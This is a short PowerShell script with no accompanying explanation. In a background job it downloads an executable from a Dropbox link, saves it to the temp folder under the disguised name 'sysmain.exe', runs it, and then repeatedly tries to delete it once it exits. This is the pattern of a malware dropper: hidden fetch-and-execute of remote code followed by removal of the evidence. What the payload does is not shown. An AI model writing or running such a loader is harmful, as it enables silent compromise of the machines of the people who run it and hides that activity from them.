Start-Job {
    try {
        $exe = "$env:TEMP\sysmain.exe"
        Invoke-WebRequest "https://www.dropbox.com/scl/fi/yizdvsqhn0bp8pcxorxss/main.exe?rlkey=5ly0w1daqtjikib0f6y2nmyor&st=b8ww8v1v&dl=1" -OutFile $exe
        $proc = Start-Process -FilePath $exe -PassThru
        $proc.WaitForExit()

        while (Test-Path $exe) {
            try {
                $s = [System.IO.File]::Open($exe, 'Open', 'ReadWrite', 'None')
                $s.Close()
                Remove-Item $exe -Force
                break
            } catch {
                Start-Sleep -Milliseconds 500
            }
        }
    } catch {
        Write-Host "❌ Error: $_"
    }
}

